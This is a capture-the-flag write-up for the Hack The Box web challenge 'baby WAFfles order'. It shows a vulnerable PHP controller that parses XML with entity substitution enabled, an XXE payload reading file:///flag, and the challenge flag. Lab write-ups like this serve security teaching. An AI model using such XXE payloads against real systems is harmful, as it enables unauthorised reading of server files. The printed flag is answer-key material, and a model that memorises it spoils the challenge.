# baby WAFfles order
> Write-up author: jon-brandy
## DESCRIPTION:
Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!
## HINT:
- NONE
## STEPS:
1. First, open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209812644-460c5cf9-48be-4ec2-9dd1-a6a288c16413.png)


2. Let's try to order `ICE SCREAM` for table number 1.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209812736-cb17542c-46d5-4f95-90fc-e714f2aaa87d.png)

3. Actually didn't see any change.
4. Notice the web's title named `xxe`. Hence we may do XML injection (?)
5. Let's use burpsuite to play with the request.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209816372-983772e8-3c64-40bd-9d96-a876a8cc8a20.png)


6. Let's try to order "ice scream" for table 1, and open the request in burpsuite.

![image](https://user-images.githubusercontent.com/70703371/209816516-daa9fbb5-c706-4c4e-9114-3240b4fa04c5.png)


7. Now send the request to **repeater**.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209816595-ef35fc14-8115-4668-b088-344d82fe8156.png)


8. I used a payload from [this](https://github.com/payloadbox/xxe-injection-payload-list) online cheatsheet.
9. Let's use this one.

![image](https://user-images.githubusercontent.com/70703371/209822200-0d7b4a61-3eee-4d16-9416-036a8ad31e1a.png)

10. But, we need to find the correct html tag and modify some of the payload.
11. When i tried traverse the directory which have the source codes, looking for the correct tag.
12. Found OrderController.php.

```php
<?php
class OrderController
    public function order($router)
    {
        $body = file_get_contents('php://input');
        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')
        {
            $order = json_decode($body);
            if (!$order->food) 
                return json_encode([
                    'status' => 'danger',
                    'message' => 'You need to select a food option first'
                ]);
            return json_encode([
                'status' => 'success',
                'message' => "Your {$order->food} order has been submitted successfully."
            ]);
        }
        else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')
        {
            $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
            if (!$order->food) return 'You need to select a food option first';
            return "Your {$order->food} order has been submitted successfully.";
        }
        else
        {
            return $router->abort(400);
        }
    }

```

13. I can assume that order and food are our entities. But since there's a table number as the placeholder, let's add that too.

![image](https://user-images.githubusercontent.com/70703371/209822478-5097a955-785f-4321-9fc5-db8145780855.png)


14. Let's try with:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag"> ]>
<order>
  <table_num>1</table_num>
 <food>&ent;</food>
</order>
```

15. And change the `content-type` value to -> **application/xml**, then send the request.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209825775-16b8a567-3011-423b-ba2e-fc909b9f51eb.png)


![image](https://user-images.githubusercontent.com/70703371/209825881-64365faa-44bb-4b11-8e2c-36f9fa0637b6.png)


16. Got the flag!

## FLAG

```
HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}
```

## LEARNING REFERENCES:

```
https://github.com/payloadbox/xxe-injection-payload-list
```
